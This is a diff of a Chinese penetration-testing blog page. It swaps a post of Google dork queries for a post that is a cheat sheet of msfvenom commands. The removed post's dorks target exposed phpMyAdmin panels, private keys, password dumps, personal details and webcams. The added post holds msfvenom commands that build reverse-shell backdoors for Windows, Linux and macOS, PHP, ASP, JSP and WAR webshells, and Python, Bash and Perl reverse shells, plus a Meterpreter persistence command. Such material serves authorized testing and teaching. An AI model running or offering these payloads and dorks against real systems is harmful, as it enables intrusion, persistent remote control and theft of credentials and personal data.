@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Search,Google hack," />
+  <meta name="keywords" content="msfvenom," />
 
 
 
@@ -84,20 +84,18 @@
 
 
 
-<meta name="description" content="介绍记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。">
-<meta name="keywords" content="Search,Google hack">
+<meta name="description" content="msfvenom生成后门的方法 二进制文件Windows">
+<meta name="keywords" content="msfvenom">
 <meta property="og:type" content="article">
-<meta property="og:title" content="搜索技巧总结">
-<meta property="og:url" content="http://sunu11.com/2017/02/22/6/index.html">
+<meta property="og:title" content="msfvenom生成payload方法">
+<meta property="og:url" content="http://sunu11.com/2017/08/29/16/index.html">
 <meta property="og:site_name" content="SuNu11&#39;Blog">
-<meta property="og:description" content="介绍记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。">
+<meta property="og:description" content="msfvenom生成后门的方法 二进制文件Windows">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://www.google.cn/landing/cnexp/google-search.png">
-<meta property="og:updated_time" content="2017-08-27T04:17:43.000Z">
+<meta property="og:updated_time" content="2017-08-29T12:25:39.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="搜索技巧总结">
-<meta name="twitter:description" content="介绍记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。">
-<meta name="twitter:image" content="http://www.google.cn/landing/cnexp/google-search.png">
+<meta name="twitter:title" content="msfvenom生成payload方法">
+<meta name="twitter:description" content="msfvenom生成后门的方法 二进制文件Windows">
 
 
 
@@ -125,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://sunu11.com/2017/02/22/6/"/>
+  <link rel="canonical" href="http://sunu11.com/2017/08/29/16/"/>
 
 
 
 
 
-  <title> 搜索技巧总结 | SuNu11'Blog </title>
+  <title> msfvenom生成payload方法 | SuNu11'Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -272,7 +270,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2017/02/22/6/">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2017/08/29/16/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="SuNu11">
@@ -296,7 +294,7 @@
             
             
               
-                搜索技巧总结
+                msfvenom生成payload方法
               
             
           </h1>
@@ -309,8 +307,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-22T21:31:36+08:00">
-                2017-02-22
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-29T20:10:56+08:00">
+                2017-08-29
               </time>
             
 
@@ -328,8 +326,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/神器/" itemprop="url" rel="index">
-                    <span itemprop="name">神器</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -343,8 +341,8 @@
             
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
-                <a href="/2017/02/22/6/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/22/6/" itemprop="commentCount"></span>
+                <a href="/2017/08/29/16/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/08/29/16/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -370,80 +368,29 @@
       
 
       
-        <p><img src="http://www.google.cn/landing/cnexp/google-search.png" alt="icon"></p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。<a id="more"></a>下面简单总结一下本人所熟悉的搜索语法：</p>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>intext:</strong> 只搜索网页部分中包含的文字(也就是忽略了标题,URL 等的文字).(管理，)<br><strong>site:</strong> 可以限制你搜索范围的域名.   ex:site: baidu.com filetype:txt 查找 TXT 文件<br><strong>filetype:</strong> 搜索文件的后缀或者扩展名  （doc.mdb.ppt.swf.sql…）<br><strong>allintitle:</strong> 搜索所有关键字构成标题的网页. 但是推荐不要使用<br><strong>link:</strong> 可以得到一个所有包含了某个指定 URL 的页面列表. 例如:link:www.google.com  就可以得到所有连接到 Google 的页面<br><strong>Intitle</strong> or <strong>Allintitle:</strong> 在页面标题中搜索<br><strong>Related:</strong> 显示相关站点<br><strong>inanchor</strong> or <strong>allinanchor:</strong> 搜索范围限制在页面的链接锚点描述文本进行搜索<br><strong>Inurl</strong> or <strong>Allinurl:</strong> 在URL中查找文本（包含大量特殊字符，最为广泛使用）用于搜索网页上包含的 URL. (file,)<br><strong>Phonebook:</strong> 搜索电话列表<br><strong>Rphonebook:</strong> 搜索住宅电话列表<br><strong>Bphonebook:</strong> 商业电话列表<br><strong>Author:</strong> 搜索Google中新闻组帖子的作者<br><strong>Group:</strong> 搜索Google标题<br><strong>Inanchor:</strong> 在链接文本中查找文本<br><strong>Masgid:</strong> 通过消息id来查找谷歌的帖子<br><strong>Daterange:</strong> 查找某个特定日期范围内发布的网页<br><strong>Insubject:</strong> 搜索Googlegroup的主题行<br><strong>Cache:</strong> 显示网页的缓存版本<br><strong>Stocks:</strong> 搜索股票信息<br><strong>Info:</strong> 显示Google的摘要信息<br><strong>Define:</strong> 显示某术语的定义<br><strong>Numrang:</strong> 搜索数字需要两个参数一个最小数，一个最大数，用破折号隔开<br><strong>+</strong>      加入被忽略的词<br><strong>-</strong>      忽略排除某个词<br><strong>~</strong>      同意词即类似的词<br><strong>.</strong>      单一的通配符<br><strong>*</strong>      通配符，可代表多个字母<br><strong>“ ”</strong>    精确查询匹配<br><strong>布尔操作:</strong><br>and  与<br>or    或<br>not  不</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote>
-<p>“Welcome to phpmyadmin <em>**” “running on </em> as root@*” intitle:phpmyadmin<br>“mysql error with query”  </p>
-</blockquote>
-<p><strong>数据库程序和错误文件</strong></p>
-<blockquote>
-<p>“Assessment report” “nessus” filetype:pdf  </p>
-</blockquote>
-<p><strong>安全扫描报告</strong></p>
-<blockquote>
-<p>“advanced guestbook * powered” inurl:addentry.php<br>intitle:”View img” inurl:viewimg.php </p>
-</blockquote>
-<p><strong>程序中含有SQL注入漏洞并且路径可以修改弱口</strong></p>
-<blockquote>
-<p>“php version” intitle:phpinfo inurl:info.php  </p>
-</blockquote>
-<p><strong>敏感信息</strong></p>
-<blockquote>
-<p>intitle:”usage Statistics(统计表) for” intext:”Total Unique Usernames”  </p>
-</blockquote>
-<p><strong>用户姓名</strong></p>
-<blockquote>
-<p>intitle:CV OR intitle:Lebenslauf “thomas fischer”<br>intitle:CV OR intitle:Lebenslauf ext:pdf OR ext:doc  </p>
-</blockquote>
-<p><strong>个人简历</strong></p>
-<blockquote>
-<p>allintext: name email phone address intext:”thomas fischer(人物)” ext:pdf<br>Twiki inurl:”View/Main” “thomas fischer”  </p>
-</blockquote>
-<p><strong>描述标识私人的信息(姓名，地址，电话，电话分机)</strong></p>
-<blockquote>
-<p>intitle:”live View/ -AXIS” | inurl:view/view.shtml<br>inurl:”ViewFrame?Mode=”<br>inurl:”MultiCameraFrame?Mode=”<br>inturl:”axis-cgi/mjpg”<br>intext:”MOBOTIX M1″<br>intext:”Open Menu”<br>inurl:”view/index.shtml”  </p>
-</blockquote>
-<p><strong>在线网络摄像头</strong></p>
-<blockquote>
-<p>“index of” (private | secure | geheim | gizli)<br>“robots.txt” “User-agent” ext:txt<br>“this document is private | confidential| secret” ext:doc | ext:pdf | ext:xls<br>intitle:”index of” “jpg | png | bmp” inurl”personal | inurl:private </p>
-</blockquote>
-<p><strong>机密的目录和文件</strong></p>
-<blockquote>
-<p>“index of” inbox.dbx<br>“To parent directory” inurl:”Identities” </p>
-</blockquote>
-<p><strong>私人信件/邮件</strong></p>
-<blockquote>
-<p>“session start” “session ident” thomas ext:txt </p>
-</blockquote>
-<p><strong>聊天日志</strong></p>
-<blockquote>
-<p>-“public | pubring | pubkeysignature | pgp | and | or |release” ext:gpg<br>-intext:”and” (ext:enc | ext:axx)<br>“ciphervalue” ext:xml</p>
-</blockquote>
-<p><strong>经过加密的消息</strong></p>
-<blockquote>
-<p>“Begin (DSA | RSA)” ext:key、“index of” “secring.gpg”  </p>
-</blockquote>
-<p><strong>搜索隐私的密码</strong></p>
-<blockquote>
-<p>“index of” slave_datatrans OR from_master </p>
-</blockquote>
-<p><strong>搜索密钥</strong></p>
-<blockquote>
-<p>“create table” insert into” “pass|passwd|password” (ext:sql | ext:dump | ext:txt)、“your password * is” (ext:csv | ext.doc | ext:txt)  </p>
-</blockquote>
-<p><strong>搜索用户名和密码</strong></p>
-<blockquote>
-<p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin  </p>
-</blockquote>
-<p><strong>查找可以未经授权就可以访问的phpMyAdmin的后台页面</strong></p>
-<blockquote>
-<p>“OpenSSL” AND “1.0.1 Server at” OR “1.0.1a Server at” OR “1.0.1b Server at” OR “1.0.1c Server at” OR “1.0.1d Server at” OR “1.0.1e Server at” OR “1.0.1f Server at”  </p>
-</blockquote>
-<h2 id="其他扩展"><a href="#其他扩展" class="headerlink" title="其他扩展"></a>其他扩展</h2><p>在使用搜索语法的同时也可以收集一些此类网址，对于找东西的帮助可是很大的呢<br><strong>搜索百度盘:</strong> <a href="http://sobaidupan.com" target="_blank" rel="external">http://sobaidupan.com</a><br><strong>盘搜:</strong> <a href="http://www.pansou.com" target="_blank" rel="external">http://www.pansou.com</a><br><strong>去转盘网:</strong> <a href="http://quzhuanpan.com" target="_blank" rel="external">http://quzhuanpan.com</a><br><strong>胖次搜索:</strong> <a href="http://www.panc.cc" target="_blank" rel="external">http://www.panc.cc</a><br><strong>西林街:</strong> <a href="http://www.xlinjie.com" target="_blank" rel="external">http://www.xlinjie.com</a><br><strong>天天云搜:</strong> <a href="http://so.ygyhg.com" target="_blank" rel="external">http://so.ygyhg.com</a><br><strong>呆木瓜:</strong> <a href="http://md5.daimugua.com" target="_blank" rel="external">http://md5.daimugua.com</a><br><strong>网盘007:</strong> <a href="http://wangpan007.com" target="_blank" rel="external">http://wangpan007.com</a><br><strong>钟馗之眼:</strong> <a href="https://www.zoomeye.org" target="_blank" rel="external">https://www.zoomeye.org</a><br><strong>shoudan:</strong> <a href="https://www.shodan.io" target="_blank" rel="external">https://www.shodan.io</a><br><strong>SeeBug:</strong> <a href="https://www.seebug.org" target="_blank" rel="external">https://www.seebug.org</a><br>等等,,,,,,</p>
-<h2 id="留意"><a href="#留意" class="headerlink" title="留意"></a>留意</h2><p>(1) 操作符、冒号、关键字之间是没有空格的。<br>(2) 布尔操作符（AND、OR、NOT）和特殊字符（-、+）仍可用作高级操作符查询，但是不能把他们放在冒号之前而把冒号和操作符分开。<br>(3) 高级操作符能够和单独的查询混合使用<br>(4) ALL操作符（以ALL开头的操作符）非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用。<br>(5) 其他更多搜索技巧可参考：<a href="https://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text=" target="_blank" rel="external">https://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text=</a></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://baike.so.com/doc/6950859-7173260.html" target="_blank" rel="external">http://baike.so.com/doc/6950859-7173260.html</a><br><a href="http://blog.jobbole.com/72211/" target="_blank" rel="external">http://blog.jobbole.com/72211/</a><br><a href="http://www.nxadmin.com/web/120.html" target="_blank" rel="external">http://www.nxadmin.com/web/120.html</a></p>
-<h4 id="随时更新，有误之处，欢迎指出，欢迎交流。"><a href="#随时更新，有误之处，欢迎指出，欢迎交流。" class="headerlink" title="随时更新，有误之处，欢迎指出，欢迎交流。"></a>随时更新，有误之处，欢迎指出，欢迎交流。</h4>
+        <p>msfvenom生成后门的方法</p>
+<h4 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h4><p>Windows<a id="more"></a></p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe</code></p>
+<p>Linux</p>
+<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf</code></p>
+<p>Mac</p>
+<p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho</code></p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>PHP</p>
+<p><code>msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php</code></p>
+<p>ASP</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp</code></p>
+<p>JSP</p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp</code></p>
+<p>WAR</p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war</code></p>
+<h4 id="脚本shell（反弹shell）"><a href="#脚本shell（反弹shell）" class="headerlink" title="脚本shell（反弹shell）"></a>脚本shell（反弹shell）</h4><p>Python</p>
+<p><code>msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py</code></p>
+<p>Bash</p>
+<p><code>msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh</code></p>
+<p>Perl</p>
+<p><code>msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl</code></p>
+<h4 id="附：持续控制"><a href="#附：持续控制" class="headerlink" title="附：持续控制"></a>附：持续控制</h4><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br>run persistence -U -i 5 –r ip port<br>-U 用户登录时反弹会话 也可以使用-X当系统启动时反弹会话<br>-i 时间</p>
+
       
     </div>
 
@@ -461,7 +408,7 @@
  
    <div class="">
    <p><span>
-   <br/><br/><b>本文出处：</b><a href="/2017/02/22/6/" title="搜索技巧总结">http://sunu11.com/2017/02/22/6/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
+   <br/><br/><b>本文出处：</b><a href="/2017/08/29/16/" title="msfvenom生成payload方法">http://sunu11.com/2017/08/29/16/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
    </span></p>
    </div>
  
@@ -491,9 +438,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Search/" rel="tag"># Search</a>
-          
-            <a href="/tags/Google-hack/" rel="tag"># Google hack</a>
+            <a href="/tags/msfvenom/" rel="tag"># msfvenom</a>
           
         </div>
       
@@ -502,8 +447,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/11/05/4/" rel="next" title="sqlmap总结（1）">
-                <i class="fa fa-chevron-left"></i> sqlmap总结（1）
+              <a href="/2017/08/28/15/" rel="next" title="Dirty COW的那些事">
+                <i class="fa fa-chevron-left"></i> Dirty COW的那些事
               </a>
             
           </div>
@@ -511,10 +456,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/03/01/7/" rel="prev" title="Linux 应急响应总结">
-                Linux 应急响应总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -540,8 +481,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/02/22/6/"
-           data-title="搜索技巧总结" data-url="http://sunu11.com/2017/02/22/6/">
+      <div class="ds-thread" data-thread-key="2017/08/29/16/"
+           data-title="msfvenom生成payload方法" data-url="http://sunu11.com/2017/08/29/16/">
       </div>
     
   </div>
@@ -693,7 +634,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础"><span class="nav-number">2.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他扩展"><span class="nav-number">4.</span> <span class="nav-text">其他扩展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#留意"><span class="nav-number">5.</span> <span class="nav-text">留意</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#随时更新，有误之处，欢迎指出，欢迎交流。"><span class="nav-number">6.0.1.</span> <span class="nav-text">随时更新，有误之处，欢迎指出，欢迎交流。</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#二进制文件"><span class="nav-number">1.</span> <span class="nav-text">二进制文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webshell"><span class="nav-number">2.</span> <span class="nav-text">webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#脚本shell（反弹shell）"><span class="nav-number">3.</span> <span class="nav-text">脚本shell（反弹shell）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#附：持续控制"><span class="nav-number">4.</span> <span class="nav-text">附：持续控制</span></a></li></ol></div>
             
 
           </div>
